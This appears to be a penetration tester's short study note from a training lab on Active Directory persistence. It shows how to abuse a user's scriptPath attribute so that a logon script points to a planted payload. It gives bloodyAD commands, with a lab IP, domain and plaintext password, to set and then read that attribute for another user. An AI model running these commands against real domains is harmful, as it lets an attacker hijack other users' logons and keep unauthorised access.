#Persistence 
# Abuse ScriptPath
Throughout engagements, abusing logon scripts via rights on a user's scriptPath attribute depends on whether we can write or read it and other factors.

Windows stores logon scripts in the scripts folder within the `SYSVOL` network share (which, on a domain controller, resides at the physical location `%systemroot%\SYSVOL\sysvol` )

note:
![[Pasted image 20250902204013.png]]
## Write scriptPath

```powershell

# if we have rights, we can change it's location to our crafted payload
bloodyAD --host "10.129.229.224" -d "inlanefreight.local" -u "david" -p 'SecurePassDav!d5' set object eric scriptPath -v 'EricsScripts\logonScript.bat'


# check
bloodyAD --host "10.129.229.224" -d "inlanefreight.local" -u "david" -p 'SecurePassDav!d5' get object eric --attr scriptPath
```